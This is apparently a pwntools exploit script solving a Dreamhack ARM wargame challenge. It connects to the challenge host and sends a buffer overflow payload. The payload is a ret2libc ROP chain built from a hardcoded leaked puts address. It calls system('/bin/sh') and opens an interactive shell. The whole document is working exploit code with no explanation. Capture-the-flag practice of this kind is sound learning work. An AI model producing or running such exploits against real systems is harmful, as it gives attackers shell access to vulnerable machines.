from pwn import *
import time
elf = ELF('/home/kali/Downloads/dreamhack/armtraining/arm_training-last')
libc = ELF('/home/kali/Downloads/dreamhack/armtraining/libc.so.6')

context.arch = 'arm'
cyberedu = 'host8.dreamhack.games:14341'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

puts_got = elf.got[b"puts"]
puts_plt = elf.plt[b"puts"]
leaked_puts = 0x3fe86bf0

libc.address = leaked_puts - libc.sym[b"puts"]
system = libc.sym[b"system"]
binsh = next(libc.search(b"/bin/sh"))

p.recvuntil(b") ")
p.sendline(b"y")

p.recvuntil(b"stop")
print("starting counter now")
sleep(26)
p.sendline()

p.recvuntil(b") ")
p.sendline(b"n")

p.recvuntil(b"!\n")

pop_r3_pc = 0x00010480
mov_r0_r3_pop_r11_pc = 0x000106e4
main = 0x106f4

payload = ( b"A" * 20 + #auStack38
            b"B" * 19 + #abStack_24
            b"C" * 4 + #response
            b"\xff" + #local_d
            b"D" * 4  + #counter
            b"E" * 4 + #rbp/r11
            p32(pop_r3_pc) + 
            p32(binsh) +
            p32(mov_r0_r3_pop_r11_pc) +
            p32(0x0) +
            p32(system) 
            )
           
print(f"len of payload is {hex(len(payload))}")
      
p.sendline(payload)

#data = p.recv(4)
#val = u32(data.ljust(4, b"\x00"))
#print(f"leaked is {hex(val)}")

p.interactive()
